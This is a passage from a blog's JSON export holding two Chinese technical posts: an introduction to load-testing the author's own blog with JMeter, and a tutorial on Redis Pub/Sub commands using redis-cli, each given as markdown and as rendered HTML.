脚本录制器\n也是一个代理服务器,它会把所有接受的请求全部记录到Test Plan配置中,你在测试中可以使用这些录制的脚本。\n\n## 测试计划元素执行顺序\n* 配置节点\n* 前置处理器\n* 定时器\n* 取样器\n* 后置处理器（只在有结果可用情况下执行）\n* 断言（只在有结果可用情况下执行）\n* 监听器（只在有结果可用情况下执行）\n\n## 性能指标\n* Label:定义的HTTP请求名称\n* Samples:表示这次测试中一共发出了多少个请求\n* Average:访问页面的平均响应时间 \n* Min:访问页面的最小响应时间\n* Max:访问页面的最大响应时间\n* Error%:错误的请求的数量/请求的总数\n* Throughpu:每秒完成的请求数\n* KB/Sec:每秒从服务器端接收到的数据量\n* Median:50％的用户响应时间\n* 90%Line:90％的用户响应时间\n* 95%Line:95％的用户响应时间\n* 99%Line:99％的用户响应时间\n时间指标的单位都是毫秒。\n\n## 第一个web性能测试\n我做了一个博客网站首页的性能测试，只设置ThreadGroup,Sampler,Listener三项就可以运行。\n\n#### ThreadGroup设置\n一个性能测试请求负载是基于一个线程组完成的，jmeter中每个测试计划至少需要包含一个线程组。Test Plan右键菜单可新增ThreadGroup(add->Threads->ThreadGroup);\n![ThreadGroup](/img/jmeter-3.png)\n* Number of Threads 线程数:虚拟用户数.一个虚拟用户占用一个进程或线程。\n* Ramp-up Period 准备时长:设置的虚拟用户数需要多长时间全部启动。\n* Loop Count 循环次数：每个线程发送请求的次数。\n\n#### Sample设置\n在ThreadGroup上右键菜单可新增HttpRequest（add->Sampler->HttpRequest).Sampler是与服务器进行交互的单元.一个Sampler通常进行三部分的工作：\n* 向服务器发送请求\n* 记录服务器的响应数据\n* 记录相应时间信息\n![HttpRequest](/img/jmeter-4.png)\n\n#### Listener设置\n脚本的主要部分设置完成后,需要通过某种方式获得性能测试中的测试结果。ThreadGroup上右键菜单可新增Listner（add->Listener->Aggregate Report).\n![HttpRequest](/img/jmeter-5.png)\n我最关心的是我的博客响应时间，数据显示客户的平均响应时间为:337毫秒,99%的用户在1985毫秒内完成，也就不超2秒。最少用户响应时间为149毫秒，最大用户响应时间为5020毫秒\n","slug":"jmeter-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0lltq000rg2x6sicro7zh","content":"<p>最近做性能优化工作，同时要给自己的工作给一个总结。需要自己弄性能测试及编写性能测试报告。在别人推荐下使用JMeter对项目进行性能测试。JMeter可以进行配置和执行负载测试、性能测试和压力测试的工具。了解一下几个概念:</p>\n<ul>\n<li>负载测试: 这类测试使系统或者应用程序在预先设计好的极端场景下测试运行。这类测试用来评估系统或者程序在极端条件下的行为。</li>\n<li>性能测试: 这种测试被用来检测系统的性能表现，包括特定情况下，系统的响应能力和稳定性。</li>\n<li>压力测试: 这类测试通过载入更多的外部资源，并使系统组件超越其所设定的能力范围,试图使系统挂掉.<a id=\"more\"></a>\nJMeter 的安装非常简单,从官方网站上下载，解压之后即可使用。运行命令在%JMETER_HOME%/bin下,对于 Windows用户来说,命令是jmeter.bat。运行前请检查JMeter的文档,查看是否具备相关的运行条件:JDK的版本要求是否满足.<h2 id=\"Test-Plan配置\"><a href=\"#Test-Plan配置\" class=\"headerlink\" title=\"Test Plan配置\"></a>Test Plan配置</h2><img src=\"/img/jmeter-1.png\" alt=\"基本配置\"><br>进去之后，你会看到Test Plan和WorkBench。这两个块东西没有太多区别，不同的是Test Plan是测试的相关配置，workbench可以帮你创建一个代理服务器帮Test Plan录制测试脚本。<h4 id=\"ThreadGroup-线程组\"><a href=\"#ThreadGroup-线程组\" class=\"headerlink\" title=\"ThreadGroup 线程组\"></a>ThreadGroup 线程组</h4>一个线程组基本上是不同的测试计划元素的组合，它是一个测试计划的核心，它控制着基本核心参数。<br>为了创建一个测试计划，首先你不得不去创建一个线程组，配置如下参数:线程数量，过渡时期，循环次数和正常情况或者错误情况下的行为：<h4 id=\"Samplers-采样器\"><a href=\"#Samplers-采样器\" class=\"headerlink\" title=\"Samplers 采样器\"></a>Samplers 采样器</h4>采样器用于发送请求到不同类型的服务器。它们是每一个测试计划的基本要素，一切都围绕这些采样器而工作：采样器执行请求，这些请求产生一个或多个响应，后续将被分析。<h4 id=\"Logic-Controllers-逻辑控制器\"><a href=\"#Logic-Controllers-逻辑控制器\" class=\"headerlink\" title=\"Logic Controllers 逻辑控制器\"></a>Logic Controllers 逻辑控制器</h4>逻辑控制器允许你配置一个线程组内不同采样器的执行顺序。<h4 id=\"Listeners-监听器\"><a href=\"#Listeners-监听器\" class=\"headerlink\" title=\"Listeners 监听器\"></a>Listeners 监听器</h4>监听器提供不同的方式查看由采样器请求产生的结果。监听器以报表、树型结构、或简明的日志文件的形式分析结果。<h4 id=\"Timers-定时器\"><a href=\"#Timers-定时器\" class=\"headerlink\" title=\"Timers 定时器\"></a>Timers 定时器</h4>定时器来定义请求之间的等待时间。如果不指定，JMeter会一个请求完成后立即执行下一个请求，没有任何等待时间。<h4 id=\"Assertions-断言\"><a href=\"#Assertions-断言\" class=\"headerlink\" title=\"Assertions 断言\"></a>Assertions 断言</h4>断言通过验证采样器请求产生的响应，来验证测试计划的有效性。类似于单元测试断言，用来检测被测试应用程序的响应质量。<h4 id=\"Configuration-nodes-配置节点\"><a href=\"#Configuration-nodes-配置节点\" class=\"headerlink\" title=\"Configuration nodes 配置节点\"></a>Configuration nodes 配置节点</h4>配置节点可以将不同的参数传递给取样器请求。<h4 id=\"Pre-processors-前置处理器\"><a href=\"#Pre-processors-前置处理器\" class=\"headerlink\" title=\"Pre processors 前置处理器\"></a>Pre processors 前置处理器</h4>前置处理器在采样器执行前被触发的元素。<h4 id=\"Post-processors-后置处理器\"><a href=\"#Post-processors-后置处理器\" class=\"headerlink\" title=\"Post processors 后置处理器\"></a>Post processors 后置处理器</h4>后置处理器是取样器被执行后被触发执行的元素。</li>\n</ul>\n<h2 id=\"WorkBench\"><a href=\"#WorkBench\" class=\"headerlink\" title=\"WorkBench\"></a>WorkBench</h2><p><img src=\"/img/jmeter-2.png\" alt=\"非测试元素\"><br>WorkBench可以Add三个Non-test Elements:</p>\n<ul>\n<li>Http Mirror Server 镜像的服务器<br>其实就是一个代理服务器,它把所有接收到的请求原封不动地返回，这样就可以看到发出请求和响应的具体内容了。</li>\n<li>Http(s) Test Script Recorder 脚本录制器<br>也是一个代理服务器,它会把所有接受的请求全部记录到Test Plan配置中,你在测试中可以使用这些录制的脚本。</li>\n</ul>\n<h2 id=\"测试计划元素执行顺序\"><a href=\"#测试计划元素执行顺序\" class=\"headerlink\" title=\"测试计划元素执行顺序\"></a>测试计划元素执行顺序</h2><ul>\n<li>配置节点</li>\n<li>前置处理器</li>\n<li>定时器</li>\n<li>取样器</li>\n<li>后置处理器（只在有结果可用情况下执行）</li>\n<li>断言（只在有结果可用情况下执行）</li>\n<li>监听器（只在有结果可用情况下执行）</li>\n</ul>\n<h2 id=\"性能指标\"><a href=\"#性能指标\" class=\"headerlink\" title=\"性能指标\"></a>性能指标</h2><ul>\n<li>Label:定义的HTTP请求名称</li>\n<li>Samples:表示这次测试中一共发出了多少个请求</li>\n<li>Average:访问页面的平均响应时间 </li>\n<li>Min:访问页面的最小响应时间</li>\n<li>Max:访问页面的最大响应时间</li>\n<li>Error%:错误的请求的数量/请求的总数</li>\n<li>Throughpu:每秒完成的请求数</li>\n<li>KB/Sec:每秒从服务器端接收到的数据量</li>\n<li>Median:50％的用户响应时间</li>\n<li>90%Line:90％的用户响应时间</li>\n<li>95%Line:95％的用户响应时间</li>\n<li>99%Line:99％的用户响应时间<br>时间指标的单位都是毫秒。</li>\n</ul>\n<h2 id=\"第一个web性能测试\"><a href=\"#第一个web性能测试\" class=\"headerlink\" title=\"第一个web性能测试\"></a>第一个web性能测试</h2><p>我做了一个博客网站首页的性能测试，只设置ThreadGroup,Sampler,Listener三项就可以运行。</p>\n<h4 id=\"ThreadGroup设置\"><a href=\"#ThreadGroup设置\" class=\"headerlink\" title=\"ThreadGroup设置\"></a>ThreadGroup设置</h4><p>一个性能测试请求负载是基于一个线程组完成的，jmeter中每个测试计划至少需要包含一个线程组。Test Plan右键菜单可新增ThreadGroup(add-&gt;Threads-&gt;ThreadGroup);<br><img src=\"/img/jmeter-3.png\" alt=\"ThreadGroup\"></p>\n<ul>\n<li>Number of Threads 线程数:虚拟用户数.一个虚拟用户占用一个进程或线程。</li>\n<li>Ramp-up Period 准备时长:设置的虚拟用户数需要多长时间全部启动。</li>\n<li>Loop Count 循环次数：每个线程发送请求的次数。</li>\n</ul>\n<h4 id=\"Sample设置\"><a href=\"#Sample设置\" class=\"headerlink\" title=\"Sample设置\"></a>Sample设置</h4><p>在ThreadGroup上右键菜单可新增HttpRequest（add-&gt;Sampler-&gt;HttpRequest).Sampler是与服务器进行交互的单元.一个Sampler通常进行三部分的工作：</p>\n<ul>\n<li>向服务器发送请求</li>\n<li>记录服务器的响应数据</li>\n<li>记录相应时间信息<br><img src=\"/img/jmeter-4.png\" alt=\"HttpRequest\"></li>\n</ul>\n<h4 id=\"Listener设置\"><a href=\"#Listener设置\" class=\"headerlink\" title=\"Listener设置\"></a>Listener设置</h4><p>脚本的主要部分设置完成后,需要通过某种方式获得性能测试中的测试结果。ThreadGroup上右键菜单可新增Listner（add-&gt;Listener-&gt;Aggregate Report).<br><img src=\"/img/jmeter-5.png\" alt=\"HttpRequest\"><br>我最关心的是我的博客响应时间，数据显示客户的平均响应时间为:337毫秒,99%的用户在1985毫秒内完成，也就不超2秒。最少用户响应时间为149毫秒，最大用户响应时间为5020毫秒</p>\n","excerpt":"<p>最近做性能优化工作，同时要给自己的工作给一个总结。需要自己弄性能测试及编写性能测试报告。在别人推荐下使用JMeter对项目进行性能测试。JMeter可以进行配置和执行负载测试、性能测试和压力测试的工具。了解一下几个概念:</p>\n<ul>\n<li>负载测试: 这类测试使系统或者应用程序在预先设计好的极端场景下测试运行。这类测试用来评估系统或者程序在极端条件下的行为。</li>\n<li>性能测试: 这种测试被用来检测系统的性能表现，包括特定情况下，系统的响应能力和稳定性。</li>\n<li>压力测试: 这类测试通过载入更多的外部资源，并使系统组件超越其所设定的能力范围,试图使系统挂掉.","more":"JMeter 的安装非常简单,从官方网站上下载，解压之后即可使用。运行命令在%JMETER_HOME%/bin下,对于 Windows用户来说,命令是jmeter.bat。运行前请检查JMeter的文档,查看是否具备相关的运行条件:JDK的版本要求是否满足.<h2 id=\"Test-Plan配置\"><a href=\"#Test-Plan配置\" class=\"headerlink\" title=\"Test Plan配置\"></a>Test Plan配置</h2><img src=\"/img/jmeter-1.png\" alt=\"基本配置\"><br>进去之后，你会看到Test Plan和WorkBench。这两个块东西没有太多区别，不同的是Test Plan是测试的相关配置，workbench可以帮你创建一个代理服务器帮Test Plan录制测试脚本。<h4 id=\"ThreadGroup-线程组\"><a href=\"#ThreadGroup-线程组\" class=\"headerlink\" title=\"ThreadGroup 线程组\"></a>ThreadGroup 线程组</h4>一个线程组基本上是不同的测试计划元素的组合，它是一个测试计划的核心，它控制着基本核心参数。<br>为了创建一个测试计划，首先你不得不去创建一个线程组，配置如下参数:线程数量，过渡时期，循环次数和正常情况或者错误情况下的行为：<h4 id=\"Samplers-采样器\"><a href=\"#Samplers-采样器\" class=\"headerlink\" title=\"Samplers 采样器\"></a>Samplers 采样器</h4>采样器用于发送请求到不同类型的服务器。它们是每一个测试计划的基本要素，一切都围绕这些采样器而工作：采样器执行请求，这些请求产生一个或多个响应，后续将被分析。<h4 id=\"Logic-Controllers-逻辑控制器\"><a href=\"#Logic-Controllers-逻辑控制器\" class=\"headerlink\" title=\"Logic Controllers 逻辑控制器\"></a>Logic Controllers 逻辑控制器</h4>逻辑控制器允许你配置一个线程组内不同采样器的执行顺序。<h4 id=\"Listeners-监听器\"><a href=\"#Listeners-监听器\" class=\"headerlink\" title=\"Listeners 监听器\"></a>Listeners 监听器</h4>监听器提供不同的方式查看由采样器请求产生的结果。监听器以报表、树型结构、或简明的日志文件的形式分析结果。<h4 id=\"Timers-定时器\"><a href=\"#Timers-定时器\" class=\"headerlink\" title=\"Timers 定时器\"></a>Timers 定时器</h4>定时器来定义请求之间的等待时间。如果不指定，JMeter会一个请求完成后立即执行下一个请求，没有任何等待时间。<h4 id=\"Assertions-断言\"><a href=\"#Assertions-断言\" class=\"headerlink\" title=\"Assertions 断言\"></a>Assertions 断言</h4>断言通过验证采样器请求产生的响应，来验证测试计划的有效性。类似于单元测试断言，用来检测被测试应用程序的响应质量。<h4 id=\"Configuration-nodes-配置节点\"><a href=\"#Configuration-nodes-配置节点\" class=\"headerlink\" title=\"Configuration nodes 配置节点\"></a>Configuration nodes 配置节点</h4>配置节点可以将不同的参数传递给取样器请求。<h4 id=\"Pre-processors-前置处理器\"><a href=\"#Pre-processors-前置处理器\" class=\"headerlink\" title=\"Pre processors 前置处理器\"></a>Pre processors 前置处理器</h4>前置处理器在采样器执行前被触发的元素。<h4 id=\"Post-processors-后置处理器\"><a href=\"#Post-processors-后置处理器\" class=\"headerlink\" title=\"Post processors 后置处理器\"></a>Post processors 后置处理器</h4>后置处理器是取样器被执行后被触发执行的元素。</li>\n</ul>\n<h2 id=\"WorkBench\"><a href=\"#WorkBench\" class=\"headerlink\" title=\"WorkBench\"></a>WorkBench</h2><p><img src=\"/img/jmeter-2.png\" alt=\"非测试元素\"><br>WorkBench可以Add三个Non-test Elements:</p>\n<ul>\n<li>Http Mirror Server 镜像的服务器<br>其实就是一个代理服务器,它把所有接收到的请求原封不动地返回，这样就可以看到发出请求和响应的具体内容了。</li>\n<li>Http(s) Test Script Recorder 脚本录制器<br>也是一个代理服务器,它会把所有接受的请求全部记录到Test Plan配置中,你在测试中可以使用这些录制的脚本。</li>\n</ul>\n<h2 id=\"测试计划元素执行顺序\"><a href=\"#测试计划元素执行顺序\" class=\"headerlink\" title=\"测试计划元素执行顺序\"></a>测试计划元素执行顺序</h2><ul>\n<li>配置节点</li>\n<li>前置处理器</li>\n<li>定时器</li>\n<li>取样器</li>\n<li>后置处理器（只在有结果可用情况下执行）</li>\n<li>断言（只在有结果可用情况下执行）</li>\n<li>监听器（只在有结果可用情况下执行）</li>\n</ul>\n<h2 id=\"性能指标\"><a href=\"#性能指标\" class=\"headerlink\" title=\"性能指标\"></a>性能指标</h2><ul>\n<li>Label:定义的HTTP请求名称</li>\n<li>Samples:表示这次测试中一共发出了多少个请求</li>\n<li>Average:访问页面的平均响应时间 </li>\n<li>Min:访问页面的最小响应时间</li>\n<li>Max:访问页面的最大响应时间</li>\n<li>Error%:错误的请求的数量/请求的总数</li>\n<li>Throughpu:每秒完成的请求数</li>\n<li>KB/Sec:每秒从服务器端接收到的数据量</li>\n<li>Median:50％的用户响应时间</li>\n<li>90%Line:90％的用户响应时间</li>\n<li>95%Line:95％的用户响应时间</li>\n<li>99%Line:99％的用户响应时间<br>时间指标的单位都是毫秒。</li>\n</ul>\n<h2 id=\"第一个web性能测试\"><a href=\"#第一个web性能测试\" class=\"headerlink\" title=\"第一个web性能测试\"></a>第一个web性能测试</h2><p>我做了一个博客网站首页的性能测试，只设置ThreadGroup,Sampler,Listener三项就可以运行。</p>\n<h4 id=\"ThreadGroup设置\"><a href=\"#ThreadGroup设置\" class=\"headerlink\" title=\"ThreadGroup设置\"></a>ThreadGroup设置</h4><p>一个性能测试请求负载是基于一个线程组完成的，jmeter中每个测试计划至少需要包含一个线程组。Test Plan右键菜单可新增ThreadGroup(add-&gt;Threads-&gt;ThreadGroup);<br><img src=\"/img/jmeter-3.png\" alt=\"ThreadGroup\"></p>\n<ul>\n<li>Number of Threads 线程数:虚拟用户数.一个虚拟用户占用一个进程或线程。</li>\n<li>Ramp-up Period 准备时长:设置的虚拟用户数需要多长时间全部启动。</li>\n<li>Loop Count 循环次数：每个线程发送请求的次数。</li>\n</ul>\n<h4 id=\"Sample设置\"><a href=\"#Sample设置\" class=\"headerlink\" title=\"Sample设置\"></a>Sample设置</h4><p>在ThreadGroup上右键菜单可新增HttpRequest（add-&gt;Sampler-&gt;HttpRequest).Sampler是与服务器进行交互的单元.一个Sampler通常进行三部分的工作：</p>\n<ul>\n<li>向服务器发送请求</li>\n<li>记录服务器的响应数据</li>\n<li>记录相应时间信息<br><img src=\"/img/jmeter-4.png\" alt=\"HttpRequest\"></li>\n</ul>\n<h4 id=\"Listener设置\"><a href=\"#Listener设置\" class=\"headerlink\" title=\"Listener设置\"></a>Listener设置</h4><p>脚本的主要部分设置完成后,需要通过某种方式获得性能测试中的测试结果。ThreadGroup上右键菜单可新增Listner（add-&gt;Listener-&gt;Aggregate Report).<br><img src=\"/img/jmeter-5.png\" alt=\"HttpRequest\"><br>我最关心的是我的博客响应时间，数据显示客户的平均响应时间为:337毫秒,99%的用户在1985毫秒内完成，也就不超2秒。最少用户响应时间为149毫秒，最大用户响应时间为5020毫秒</p>"},{"title":"redis学习2 Pub/Sub","date":"2016-03-01T16:00:00.000Z","desc":"redis Pub/Sub 发布及订阅","_content":"Pub/Sub功能（means Publish,Subscribe）即发布及订阅功能.在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这让我想到了一种模式:观察者模式。定义了一种一对多的依赖关系，让多个观察者对象同时监听某一发布者（主题对象或目标对象），在发布者的状态发生变化时，会通知所有观察者对象。\n常见的应用场景:构建实时消息系统，比如普通的即时聊天，群聊等功能。消息队列功能.\n<!-- more -->\n## Redis-cli\n* PSUBSCRIBE\n* PUBLISH\n* PUNSUBSCRIBE\n* SUBSCRIBE\n* UNSUBSCRIBE\n\n### 一个客户端进行订阅操作(SUBSCRIBE)。\n``` bash\n$ redis-cli\n127.0.0.1:6379>subscribe first second\nReading messages....\n1) \"subscribe\"\n2) \"first\"\n3) (integer) 1\n1) \"subscribe\"\n2) \"second\"\n3) (integer) 2\n```\n订阅first及second两个频道。\n\n### 另一个客户端发布订阅消息(PUBLISH):\n``` bash\n$ redis-cli\n127.0.0.1:6379>publish first 1\n```\n订阅客户端收到消息:\n``` bash\n$ redis-cli\n127.0.0.1:6379>subscribe first second\nReading messages....\n1) \"subscribe\"\n2) \"first\"\n3) (integer) 1\n1) \"subscribe\"\n2) \"second\"\n3) (integer) 2\n1) \"message\"\n2) \"first\"\n3) \"1\"\n```\n\n### 退订(UNSUBSCRIBE)\n``` bash\n$ redis-cli\n127.0.0.1:6379>unsubsribe  first \nReading messages....\n1) \"unsubsribe\"\n2) \"first\"\n3) (integer) 0\n```\n\n### 按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)\n每个模式以 * 作为匹配符，比如 it* 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)。 news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类","source":"_posts/redis-2.md","raw":"---\ntitle: redis学习2 Pub/Sub\ndate: 2016-3-2\ndesc: redis Pub/Sub 发布及订阅\n---\nPub/Sub功能（means Publish,Subscribe）即发布及订阅功能.在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这让我想到了一种模式:观察者模式。定义了一种一对多的依赖关系，让多个观察者对象同时监听某一发布者（主题对象或目标对象），在发布者的状态发生变化时，会通知所有观察者对象。\n常见的应用场景:构建实时消息系统，比如普通的即时聊天，群聊等功能。消息队列功能.\n<!-- more -->\n## Redis-cli\n* PSUBSCRIBE\n* PUBLISH\n* PUNSUBSCRIBE\n* SUBSCRIBE\n* UNSUBSCRIBE\n\n### 一个客户端进行订阅操作(SUBSCRIBE)。\n``` bash\n$ redis-cli\n127.0.0.1:6379>subscribe first second\nReading messages....\n1) \"subscribe\"\n2) \"first\"\n3) (integer) 1\n1) \"subscribe\"\n2) \"second\"\n3) (integer) 2\n```\n订阅first及second两个频道。\n\n### 另一个客户端发布订阅消息(PUBLISH):\n``` bash\n$ redis-cli\n127.0.0.1:6379>publish first 1\n```\n订阅客户端收到消息:\n``` bash\n$ redis-cli\n127.0.0.1:6379>subscribe first second\nReading messages....\n1) \"subscribe\"\n2) \"first\"\n3) (integer) 1\n1) \"subscribe\"\n2) \"second\"\n3) (integer) 2\n1) \"message\"\n2) \"first\"\n3) \"1\"\n```\n\n### 退订(UNSUBSCRIBE)\n``` bash\n$ redis-cli\n127.0.0.1:6379>unsubsribe  first \nReading messages....\n1) \"unsubsribe\"\n2) \"first\"\n3) (integer) 0\n```\n\n### 按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)\n每个模式以 * 作为匹配符，比如 it* 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)。 news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类","slug":"redis-2","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llts000sg2x66iz142hn","content":"<p>Pub/Sub功能（means Publish,Subscribe）即发布及订阅功能.在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这让我想到了一种模式:观察者模式。定义了一种一对多的依赖关系，让多个观察者对象同时监听某一发布者（主题对象或目标对象），在发布者的状态发生变化时，会通知所有观察者对象。<br>常见的应用场景:构建实时消息系统，比如普通的即时聊天，群聊等功能。消息队列功能.<br><a id=\"more\"></a></p>\n<h2 id=\"Redis-cli\"><a href=\"#Redis-cli\" class=\"headerlink\" title=\"Redis-cli\"></a>Redis-cli</h2><ul>\n<li>PSUBSCRIBE</li>\n<li>PUBLISH</li>\n<li>PUNSUBSCRIBE</li>\n<li>SUBSCRIBE</li>\n<li>UNSUBSCRIBE</li>\n</ul>\n<h3 id=\"一个客户端进行订阅操作-SUBSCRIBE-。\"><a href=\"#一个客户端进行订阅操作-SUBSCRIBE-。\" class=\"headerlink\" title=\"一个客户端进行订阅操作(SUBSCRIBE)。\"></a>一个客户端进行订阅操作(SUBSCRIBE)。</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;subscribe first second</span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"second\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 2</span><br></pre></td></tr></table></figure>\n<p>订阅first及second两个频道。</p>\n<h3 id=\"另一个客户端发布订阅消息-PUBLISH\"><a href=\"#另一个客户端发布订阅消息-PUBLISH\" class=\"headerlink\" title=\"另一个客户端发布订阅消息(PUBLISH):\"></a>另一个客户端发布订阅消息(PUBLISH):</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;publish first 1</span><br></pre></td></tr></table></figure>\n<p>订阅客户端收到消息:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;subscribe first second</span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"second\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 2</span><br><span class=\"line\">1) <span class=\"string\">\"message\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) <span class=\"string\">\"1\"</span></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"退订-UNSUBSCRIBE\"><a href=\"#退订-UNSUBSCRIBE\" class=\"headerlink\" title=\"退订(UNSUBSCRIBE)\"></a>退订(UNSUBSCRIBE)</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;unsubsribe  first </span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"unsubsribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 0</span><br></pre></td></tr></table></figure>\n<h3 id=\"按模式订阅和退订-PSUBSCRIBE和PUNSUBSCRIBE\"><a href=\"#按模式订阅和退订-PSUBSCRIBE和PUNSUBSCRIBE\" class=\"headerlink\" title=\"按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)\"></a>按模式订阅和退订(PSUBSCRIBE和PUNSUBSCRIBE)</h3><p>每个模式以 <em> 作为匹配符，比如 it</em> 匹配所有以 it 开头的频道( it.news 、 it.blog 、 it.tweets 等等)。 news.* 匹配所有以 news. 开头的频道( news.it 、 news.global.today 等等)，诸如此类</p>\n","excerpt":"<p>Pub/Sub功能（means Publish,Subscribe）即发布及订阅功能.在Redis中，你可以设定对某一个key值进行消息发布及消息订阅，当一个key值上进行了消息发布后，所有订阅它的客户端都会收到相应的消息。这让我想到了一种模式:观察者模式。定义了一种一对多的依赖关系，让多个观察者对象同时监听某一发布者（主题对象或目标对象），在发布者的状态发生变化时，会通知所有观察者对象。<br>常见的应用场景:构建实时消息系统，比如普通的即时聊天，群聊等功能。消息队列功能.<br>","more":"</p>\n<h2 id=\"Redis-cli\"><a href=\"#Redis-cli\" class=\"headerlink\" title=\"Redis-cli\"></a>Redis-cli</h2><ul>\n<li>PSUBSCRIBE</li>\n<li>PUBLISH</li>\n<li>PUNSUBSCRIBE</li>\n<li>SUBSCRIBE</li>\n<li>UNSUBSCRIBE</li>\n</ul>\n<h3 id=\"一个客户端进行订阅操作-SUBSCRIBE-。\"><a href=\"#一个客户端进行订阅操作-SUBSCRIBE-。\" class=\"headerlink\" title=\"一个客户端进行订阅操作(SUBSCRIBE)。\"></a>一个客户端进行订阅操作(SUBSCRIBE)。</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;subscribe first second</span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"second\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 2</span><br></pre></td></tr></table></figure>\n<p>订阅first及second两个频道。</p>\n<h3 id=\"另一个客户端发布订阅消息-PUBLISH\"><a href=\"#另一个客户端发布订阅消息-PUBLISH\" class=\"headerlink\" title=\"另一个客户端发布订阅消息(PUBLISH):\"></a>另一个客户端发布订阅消息(PUBLISH):</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;publish first 1</span><br></pre></td></tr></table></figure>\n<p>订阅客户端收到消息:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ redis-cli</span><br><span class=\"line\">127.0.0.1:6379&gt;subscribe first second</span><br><span class=\"line\">Reading messages....</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"first\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 1</span><br><span class=\"line\">1) <span class=\"string\">\"subscribe\"</span></span><br><span class=\"line\">2) <span class=\"string\">\"second\"</span></span><br><span class=\"line\">3) (<span class=\"built_in\">integer</span>) 2</span><br><span class=\"line\">1) <span class=\"string\">\"message\"</span></span><br><span class=\"line\">2) <span 